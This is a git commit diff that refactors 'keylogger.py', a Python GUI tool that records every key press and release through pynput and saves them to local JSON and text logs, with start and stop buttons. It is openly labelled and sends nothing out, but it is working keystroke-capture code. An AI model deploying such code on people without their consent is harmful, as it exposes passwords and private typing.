e96dfc9a6f8f181c8c677130e261632570c04232
ramprasathmk <mkramprasath12@gmail.com>
2024-11-14 20:05:41 +0545

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -5,7 +5,10 @@ from tkinter import Tk as _Tk
 from tkinter import Button as _Button
 from tkinter import Label as _Label
 from pynput import keyboard as _keyboard
+from typing import Any as _Any
+
 import json as _JSON
+
 
 keys_used: list = []
 flag: bool = False
@@ -21,17 +24,17 @@ def generate_text_log(key) -> None:
         keys.write(key)
 
 
-def generate_json_file(keys_used) -> None:
+def generate_json_file(used_keys) -> None:
     """
-    def generate_json_file(keys_used: Any) -> None:
+    def generate_json_file(used_keys: Any) -> None:
         Generate the logs in .json format
     """
     with open("./out/key_log.json", "+wb") as key_log:
-        key_list_bytes = _JSON.dumps(keys_used).encode()
+        key_list_bytes = _JSON.dumps(used_keys).encode()
         key_log.write(key_list_bytes)
 
 
-def on_press(key) -> None:
+def on_press(key: _Any) -> None:
     global flag, keys_used, keys
     if flag == False:
         keys_used.append({"Pressed": f"{key}"})
@@ -42,7 +45,7 @@ def on_press(key) -> None:
     generate_json_file(keys_used)
 
 
-def on_release(key) -> None:
+def on_release(key: _Any) -> None:
     global flag, keys_used, keys
     keys_used.append({"Released": f"{key}"})
 
@@ -54,28 +57,38 @@ def on_release(key) -> None:
     generate_text_log(str(keys))
 
 
+_LISTENER = _keyboard.Listener(on_press=on_press, on_release=on_release)
+
+
+def start_keylogger():
+    """
+    def start_keylogger() -> None:
+        Starts the keylogger's instance
+    """
+
+    listener = _LISTENER
+    listener.start()
+    label.config(
+        text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'"
+    )
+    start_button.config(state="disabled")
+    stop_button.config(state="normal")
+
+
+def stop_keylogger():
+    """
+    def stop_keylogger() -> None:
+        Stops the keylogger's instance
+    """
+
+    listener = _LISTENER
+    listener.stop()
+    label.config(text="Keylogger stopped.")
+    start_button.config(state="normal")
+    stop_button.config(state="disabled")
+
+
 if __name__ == "__main__":
-
-    def start_keylogger():
-        global listener
-        listener = _keyboard.Listener(on_press=on_press, on_release=on_release)
-        listener.start()
-        label.config(
-            text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'"
-        )
-        start_button.config(state="disabled")
-        stop_button.config(state="normal")
-
-    def stop_keylogger():
-        """
-        def stop_keylogger() -> None:
-            Stops the keylogger's instance
-        """
-        global listener
-        listener.stop()
-        label.config(text="Keylogger stopped.")
-        start_button.config(state="normal")
-        stop_button.config(state="disabled")
 
     root = _Tk()
     root.title("Keylogger")
